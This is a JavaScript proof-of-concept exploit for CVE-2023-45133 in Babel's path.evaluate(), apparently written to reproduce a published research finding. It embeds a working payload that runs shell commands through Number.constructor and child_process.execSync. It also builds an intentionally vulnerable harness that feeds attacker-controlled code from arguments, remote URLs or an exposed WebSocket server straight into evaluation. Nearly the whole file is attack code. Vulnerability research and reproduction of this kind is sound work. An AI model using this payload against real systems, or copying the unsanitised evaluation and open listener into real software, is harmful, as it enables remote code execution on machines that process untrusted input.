// CVE-2023-45133: Arbitrary Code Execution in Babel path.evaluate()
// Exploit: Attacker-controlled input -> path.evaluate() -> RCE
// Ref: https://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/
const parser = require('@babel/parser');
const traverse = require('@babel/traverse').default;
const axios = require('axios');
const wordWrap = require('word-wrap');
const WebSocket = require('ws');

// Exact PoC payload from blog: Number.constructor + String({toString}) triggers RCE
const EXPLOIT_PAYLOAD = `String({ toString: Number.constructor("console.log(process.mainModule.require('child_process').execSync('id').toString())")});`;

// REMOTE INPUT: Attacker supplies code via argv, HTTP, or WebSocket - propagates to path.evaluate()
async function getCode(input) {
    if (!input) return `const answer = 40 + 2;`;
    if (input.startsWith('http://') || input.startsWith('https://')) {
        const res = await axios.get(input);
        return res.data;
    }
    return input;
}

// VULNERABLE: Matches blog PoC - path.evaluate() called on attacker-controlled AST
// No sanitization - crafted expressions (Number.constructor, String+toString) execute during evaluation
function analyzeCode(source) {
    const ast = parser.parse(source);
    const evalVisitor = {
        Expression(path) {
            path.evaluate(); // CVE-2023-45133 trigger - executes crafted code
        },
    };
    traverse(ast, evalVisitor);
}

async function main() {
    const useWs = process.argv.includes('--ws');
    const useExploit = process.argv.includes('--exploit');
    const input = process.argv.find((a, i) => i > 0 && !a.startsWith('--'));

    if (useWs) {
        const wss = new WebSocket.Server({ port: 8080 });
        console.log('WebSocket server on ws://localhost:8080 - attacker sends JS code');
        wss.on('connection', (ws) => {
            ws.on('message', (data) => {
                const code = data.toString();
                console.log('Attacker code:\n', wordWrap(code, { width: 80 }));
                analyzeCode(code); // Attacker input -> path.evaluate()
                ws.send('Done.');
            });
        });
        return;
    }

    // --exploit: Run exact PoC from blog (proves vulnerability is applicable)
    const code = useExploit ? EXPLOIT_PAYLOAD : await getCode(input);
    console.log('Code to analyze:\n', wordWrap(code, { width: 80 }));
    analyzeCode(code);
    console.log('Analysis done.');
}

main().catch(console.error);